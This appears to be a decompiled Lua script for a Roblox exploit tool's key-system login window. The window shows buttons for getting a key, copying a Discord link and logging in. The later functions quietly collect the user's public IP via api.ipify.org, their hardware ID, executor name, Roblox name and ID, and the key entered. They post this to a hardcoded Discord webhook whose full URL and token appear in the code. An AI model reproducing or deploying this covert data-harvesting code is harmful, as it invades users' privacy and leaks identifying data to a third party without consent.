                        capturedSetclipboardValue,
                        capturedItems3,
                        capturedCallback2
                    )
                )
                callback(
                    "DISCORD",
                    (environment.Color3.fromRGB(88, 101, 242)),
                    functions.handleCallbackAtLine73(
                        environment,
                        capturedSetclipboardValue,
                        argument22,
                        capturedCallback2
                    )
                )
                callback(
                    "LOGIN",
                    (environment.Color3.fromRGB(192, 57, 43)),
                    functions.handleCallbackAtLine40(environment, capturedCallback, createResult, argument22)
                )
                value5 = capturedItems2
                create3 = value5.Create
                items3 = {}
                items3.Parent = parent3
                size3 = environment.UDim2.new(1, -48, 0, 20)
                items3.Size = size3
                position4 = environment.UDim2.new(0, 24, 1, -30)
                items3.Position = position4
                items3.BackgroundTransparency = 1
                parent2 = create3(value5, "Frame", items3)
                value6 = capturedItems2
                create4 = value6.Create
                items4 = {}
                items4.Parent = parent2
                size4 = environment.UDim2.new(0.5, 0, 1, 0)
                items4.Size = size4
                items4.BackgroundTransparency = 1
                items4.Text = "Secured by PandaAuth New API"
                textColor32 = environment.Color3.fromRGB(70, 70, 80)
                items4.TextColor3 = textColor32
                font2 = environment.Enum.Font.GothamBold
                items4.Font = font2
                items4.TextSize = 10
                textXAlignment = environment.Enum.TextXAlignment.Left
                items4.TextXAlignment = textXAlignment
                createResult3 = create4(value6, "TextLabel", items4)
                value7 = capturedItems2
                create5 = value7.Create
                items5 = {}
                items5.Parent = parent2
                size5 = environment.UDim2.new(0.5, 0, 1, 0)
                items5.Size = size5
                position5 = environment.UDim2.new(0.5, 0, 0, 0)
                items5.Position = position5
                items5.BackgroundTransparency = 1
                items5.Text = "v1.1.0"
                textColor33 = environment.Color3.fromRGB(50, 50, 60)
                items5.TextColor3 = textColor33
                font3 = environment.Enum.Font.GothamBold
                items5.Font = font3
                items5.TextSize = 10
                textXAlignment2 = environment.Enum.TextXAlignment.Right
                items5.TextXAlignment = textXAlignment2
                createResult4 = create5(value7, "TextLabel", items5)
                capturedCallback3(parent3)
                return
            else
                return
            end
        end
    end, closureEnvironment)
end

function functions.handleFromRGB(closureEnvironment, capturedItems2, capturedCreateResult2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local text, argument2, argument3 = ...
        local addStroke, backgroundColor3, callResults, create, createResult, font, items, mouseButton1Click, mouseEnter, mouseLeave, size, textColor3
        local value, value2, value3
        value3 = capturedItems2
        create = value3.Create
        items = {}
        items.Parent = capturedCreateResult2
        size = environment.UDim2.new(0.333, -8, 1, 0)
        items.Size = size
        backgroundColor3 = environment.Color3.fromRGB(25, 25, 28)
        items.BackgroundColor3 = backgroundColor3
        items.Text = text
        textColor3 = environment.Color3.fromRGB(200, 200, 200)
        items.TextColor3 = textColor3
        font = environment.Enum.Font.GothamBold
        items.Font = font
        items.TextSize = 12
        items.AutoButtonColor = false
        createResult = create(value3, "TextButton", items)
        value = capturedItems2
        value.AddCorner(value, createResult, 8)
        value2 = capturedItems2
        addStroke = value2.AddStroke
        callResults = runtime.pack(environment.Color3.fromRGB(50, 50, 55))
        addStroke(value2, createResult, runtime.unpack(callResults, 1, (((callResults.n + 8) - 1) - 7)))
        mouseEnter = createResult.MouseEnter
        mouseEnter.Connect(mouseEnter, functions.handleNew8(environment, createResult, argument2))
        mouseLeave = createResult.MouseLeave
        mouseLeave.Connect(mouseLeave, functions.handleFromRGBAtLine3(environment, createResult))
        mouseButton1Click = createResult.MouseButton1Click
        mouseButton1Click.Connect(mouseButton1Click, argument3)
        return
    end, closureEnvironment)
end

function functions.handleNew8(closureEnvironment, capturedCreateResult, capturedArgument2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local textColor3
        capturedCreateResult.BackgroundColor3 = capturedArgument2
        textColor3 = environment.Color3.new(1, 1, 1)
        capturedCreateResult.TextColor3 = textColor3
        return
    end, closureEnvironment)
end

function functions.handleFromRGBAtLine3(closureEnvironment, capturedCreateResult)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local backgroundColor3, textColor3
        backgroundColor3 = environment.Color3.fromRGB(25, 25, 28)
        capturedCreateResult.BackgroundColor3 = backgroundColor3
        textColor3 = environment.Color3.fromRGB(200, 200, 200)
        capturedCreateResult.TextColor3 = textColor3
        return
    end, closureEnvironment)
end

function functions.handleDestroy(closureEnvironment, capturedCreateResult)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        value = capturedCreateResult
        value.Destroy(value)
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine40(
    closureEnvironment,
    capturedCallback,
    capturedCreateResult,
    capturedArgument22
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        capturedCallback(capturedCreateResult.Text, capturedArgument22.File)
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine73(
    closureEnvironment,
    capturedSetclipboardValue,
    capturedArgument22,
    capturedCallback2
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        capturedSetclipboardValue(capturedArgument22.Discord)
        capturedCallback2("Success", "Discord Copied!")
        return
    end, closureEnvironment)
end

function functions.handleGetKeyURL(
    closureEnvironment,
    capturedSetclipboardValue,
    capturedItems3,
    capturedCallback2
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, value
        value = capturedSetclipboardValue
        callResults = runtime.pack(capturedItems3.GetKeyURL())
        value(runtime.unpack(callResults, 1, (((callResults.n + 2) - 1) - 1)))
        capturedCallback2("Success", "Link Copied to Clipboard!")
        return
    end, closureEnvironment)
end

function functions.handlePrint(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        environment.print("Clipboard:", argument1)
        return
    end, closureEnvironment)
end

function functions.handleNew9(closureEnvironment, capturedItems2, capturedCreateResult)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local text, text2 = ...
        local backgroundColor3, create, create2, create3, createResult, createResult2, font, font2, items, items2, items3, parent
        local position, position2, position3, size, size2, size3, textColor3, textColor32, textXAlignment, textXAlignment2, value, value2
        local value3, value4, value5, value6
        value6 = capturedItems2
        create = value6.Create
        items = {}
        items.Parent = capturedCreateResult
        size = environment.UDim2.fromOffset(280, 80)
        items.Size = size
        position = environment.UDim2.new(1, -300, 0, 50)
        items.Position = position
        backgroundColor3 = environment.Color3.fromRGB(18, 18, 20)
        items.BackgroundColor3 = backgroundColor3
        items.BorderSizePixel = 0
        parent = create(value6, "Frame", items)
        value = capturedItems2
        value.AddCorner(value, parent, 8)
        value2 = capturedItems2
        value2.AddStroke(value2, parent, (environment.Color3.fromRGB(231, 76, 60)), 1)
        value3 = capturedItems2
        value3.AddShadow(value3, parent)
        value4 = capturedItems2
        create2 = value4.Create
        items2 = {}
        items2.Parent = parent
        size2 = environment.UDim2.new(1, -20, 0, 25)
        items2.Size = size2
        position2 = environment.UDim2.new(0, 10, 0, 5)
        items2.Position = position2
        items2.Text = text
        textColor3 = environment.Color3.fromRGB(255, 255, 255)
        items2.TextColor3 = textColor3
        font = environment.Enum.Font.GothamBold
        items2.Font = font
        items2.TextSize = 14
        items2.BackgroundTransparency = 1
        textXAlignment = environment.Enum.TextXAlignment.Left
        items2.TextXAlignment = textXAlignment
        createResult = create2(value4, "TextLabel", items2)
        value5 = capturedItems2
        create3 = value5.Create
        items3 = {}
        items3.Parent = parent
        size3 = environment.UDim2.new(1, -20, 0, 40)
        items3.Size = size3
        position3 = environment.UDim2.new(0, 10, 0, 30)
        items3.Position = position3
        items3.Text = text2
        textColor32 = environment.Color3.fromRGB(180, 180, 180)
        items3.TextColor3 = textColor32
        font2 = environment.Enum.Font.Gotham
        items3.Font = font2
        items3.TextSize = 12
        items3.BackgroundTransparency = 1
        items3.TextWrapped = true
        textXAlignment2 = environment.Enum.TextXAlignment.Left
        items3.TextXAlignment = textXAlignment2
        createResult2 = create3(value5, "TextLabel", items3)
        environment.task.delay(3, functions.handleDestroyAtLine73(environment, parent))
        return
    end, closureEnvironment)
end

function functions.handleDestroyAtLine73(closureEnvironment, capturedParent)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        value = capturedParent
        value.Destroy(value)
        return
    end, closureEnvironment)
end

function functions.handleConnectAtLine1(closureEnvironment, capturedClonerefResult5)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, inputBegan, inputChanged, sharedValueState, sharedValueState2, sharedValueState3
        sharedValueState = {}
        sharedValueState2 = {}
        sharedValueState3 = {}
        argument12 = argument1
        sharedValueState.value = nil
        sharedValueState2.value = nil
        sharedValueState3.value = nil
        inputBegan = argument12.InputBegan
        inputBegan.Connect(
            inputBegan,
            functions.handleConnect2(
                environment,
                sharedValueState,
                sharedValueState2,
                sharedValueState3,
                argument12
            )
        )
        inputChanged = capturedClonerefResult5.InputChanged
        inputChanged.Connect(
            inputChanged,
            functions.handleNew10(
                environment,
                sharedValueState,
                sharedValueState2,
                argument12,
                sharedValueState3
            )
        )
        return
    end, closureEnvironment)
end

function functions.handleConnect2(
    closureEnvironment,
    capturedSharedValueState,
    capturedSharedValueState2,
    capturedSharedValueState3,
    capturedArgument12
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, changed, position, position2
        argument12 = argument1
        if
            not (
                (argument12.UserInputType ~= environment.Enum.UserInputType.MouseButton1)
                and (argument12.UserInputType ~= environment.Enum.UserInputType.Touch)
            )
        then
            capturedSharedValueState.value = true
            position = argument12.Position
            capturedSharedValueState2.value = position
            position2 = capturedArgument12.Position
            capturedSharedValueState3.value = position2
            changed = argument12.Changed
            changed.Connect(
                changed,
                functions.handleCallbackAtLine85(environment, argument12, capturedSharedValueState)
            )
        end
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine85(closureEnvironment, capturedArgument12, capturedSharedValueState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        if capturedArgument12.UserInputState == environment.Enum.UserInputState.End then
            capturedSharedValueState.value = false
        end
        return
    end, closureEnvironment)
end

function functions.handleNew10(
    closureEnvironment,
    capturedSharedValueState,
    capturedSharedValueState2,
    capturedArgument12,
    capturedSharedValueState3
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, numberValue, position
        argument12 = argument1
        if
            not (
                not capturedSharedValueState.value
                or (
                    (argument12.UserInputType ~= environment.Enum.UserInputType.MouseMovement)
                    and (argument12.UserInputType ~= environment.Enum.UserInputType.Touch)
                )
            )
        then
            numberValue = (argument12.Position - capturedSharedValueState2.value)
            position = environment.UDim2.new(
                capturedSharedValueState3.value.X.Scale,
                (capturedSharedValueState3.value.X.Offset + numberValue.X),
                capturedSharedValueState3.value.Y.Scale,
                (capturedSharedValueState3.value.Y.Offset + numberValue.Y)
            )
            capturedArgument12.Position = position
        end
        return
    end, closureEnvironment)
end

function functions.handleWritefile(closureEnvironment, capturedArgument1, capturedArgument2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local iterationCursor, iterationCursor2, iterationCursor3, iterationLimit, iterationLimit2, iterationStep, iterationStep2, matches, savedIterations, savedIterations2, splitResult, textValue
        local value
        value = capturedArgument1
        splitResult = value.split(value, "/")
        iterationCursor3 = nil
        if 1 < #splitResult then
            textValue = ""
            savedIterations = { nil, [5] = nil, nil, nil }
            iterationStep = (1 + 0)
            iterationLimit = ((#splitResult - 1) + 0)
            iterationCursor = (1 - iterationStep)
            while true do
                iterationCursor = (iterationCursor + iterationStep)
                if iterationStep <= 0 then
                    matches = (iterationCursor >= iterationLimit)
                else
                    matches = (iterationCursor <= iterationLimit)
                end
                if matches then
                    iterationCursor3 = iterationCursor
                end
                if matches then
                    textValue = (textValue .. (splitResult[iterationCursor3] .. "/"))
                    if not (environment.isfolder(textValue)) then
                        environment.makefolder(textValue)
                    end
                    continue
                end
                break
            end
            iterationCursor2 = savedIterations[3]
            iterationLimit2 = savedIterations[2]
            iterationStep2 = savedIterations[5]
            savedIterations2 = savedIterations[1]
        end
        environment.writefile(capturedArgument1, capturedArgument2)
        return
    end, closureEnvironment)
end

function functions.handleGethwid(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gethwidResult
        gethwidResult = environment.gethwid
        if gethwidResult then
            gethwidResult = environment.gethwid()
        end
        return gethwidResult
    end, closureEnvironment)
end

function functions.handleFormatAtLine12(
    closureEnvironment,
    capturedRequest,
    capturedClonerefResult2,
    capturedArgument12,
    capturedClonerefResult3
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local body, embeds, fields, footer, headers, identifyexecutorValueState, items, items2, items3, items4, items5, items6
        local items7, text, textValueState, value, value2, value3, value4, value5, value6
        textValueState = {}
        identifyexecutorValueState = {}
        textValueState.value = capturedRequest
        if not textValueState.value then
            return
        else
            textValueState.value = "Unknown"
            identifyexecutorValueState.value = environment.gethwid
            if identifyexecutorValueState.value then
                identifyexecutorValueState.value = environment.pcall
                identifyexecutorValueState.value(functions.handleGethwidAtLine33(environment, textValueState))
            end
            if (not textValueState.value) or (textValueState.value == "Unknown") then
                identifyexecutorValueState.value = environment.getexecutorname
                if identifyexecutorValueState.value then
                    identifyexecutorValueState.value = environment.getexecutorname
                    identifyexecutorValueState.value = identifyexecutorValueState.value()
                end
                if not identifyexecutorValueState.value then
                    identifyexecutorValueState.value = environment.identifyexecutor
                    if identifyexecutorValueState.value then
                        identifyexecutorValueState.value = environment.identifyexecutor
                        identifyexecutorValueState.value = identifyexecutorValueState.value()
                    end
                end
                if not identifyexecutorValueState.value then
                    identifyexecutorValueState.value = "unknown"
                end
                textValueState.value = (
                    "P_"
                    .. (
                        (environment.tostring(capturedClonerefResult2.LocalPlayer.UserId))
                        .. ("_" .. identifyexecutorValueState.value)
                    )
                )
            end
            identifyexecutorValueState.value = "Unknown"
            environment.pcall(functions.handleHttpGetAtLine7(environment, identifyexecutorValueState))
            items = {}
            items.username = "Lume.Dev Logger"
            items.avatar_url = "https://i.imgur.com/AsX6V96.png"
            embeds = runtime.create(1)
            items2 = {}
            items2.title = "🔐 Access Granted: Lume.Dev"
            items2.color = 65280
            fields = runtime.create(4)
            items3 = {}
            items3.name = "👤 User Profile"
            value = environment.string.format(
                "Name: `%s`\nDisplay: `%s`\nID: `%d`",
                capturedClonerefResult2.LocalPlayer.Name,
                capturedClonerefResult2.LocalPlayer.DisplayName,
                capturedClonerefResult2.LocalPlayer.UserId
            )
            items3.value = value
            items3.inline = false
            items4 = {}
            items4.name = "🌐 Network Info"
            value2 = environment.string.format("IP: ||%s||", identifyexecutorValueState.value)
            items4.value = value2
            items4.inline = true
            items5 = {}
            items5.name = "🔑 Key Used"
            value3 = environment.string.format("||`%s`||", capturedArgument12)
            items5.value = value3
            items5.inline = false
            items6 = {}
            items6.name = "💻 Hardware ID (HWID)"
            value4 = environment.string.format("```%s```", textValueState.value)
            items6.value = value4
            items6.inline = false
            runtime.move({ items3, items4, items5, items6 }, 1, 4, 1, fields)
            items2.fields = fields
            footer = {}
            text = ("Lume.Dev Auth System • " .. (environment.os.date("%Y-%m-%d %H:%M:%S")))
            footer.text = text
            items2.footer = footer
            runtime.move({ items2 }, 1, 1, 1, embeds)
            items.embeds = embeds
            value5 = capturedRequest
            items7 = {}
            items7.Url =
                "https://ptb.discord.com/api/webhooks/1467159900986675416/YH8HUBXGpSpuSFiqrJlIncJD_CEoQK-CSvStXj3kKCCbrt6Yi6q19-HnBggxIwE22QKZ"
            items7.Method = "POST"
            headers = {}
            headers["Content-Type"] = "application/json"
            items7.Headers = headers
            value6 = capturedClonerefResult3
            body = value6.JSONEncode(value6, items)
            items7.Body = body
            value5(items7)
            return
        end
    end, closureEnvironment)
end

function functions.handleHttpGetAtLine7(closureEnvironment, capturedIdentifyexecutorValueState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, httpGetResult
        gameValue = environment.game
        httpGetResult = gameValue.HttpGet(gameValue, "https://api.ipify.org")
        capturedIdentifyexecutorValueState.value = httpGetResult
        return
    end, closureEnvironment)
end

function functions.handleGethwidAtLine33(closureEnvironment, capturedTextValueState)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gethwidResult
        gethwidResult = environment.gethwid()
        capturedTextValueState.value = gethwidResult
        return
    end, closureEnvironment)
end

function functions.handleJSONDecode(closureEnvironment, capturedClonerefResult3, capturedResult)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        value = capturedClonerefResult3
        return value.JSONDecode(value, capturedResult.Body)
    end, closureEnvironment)
end

return functions.runApplication(runtime.getEnvironment())(...)
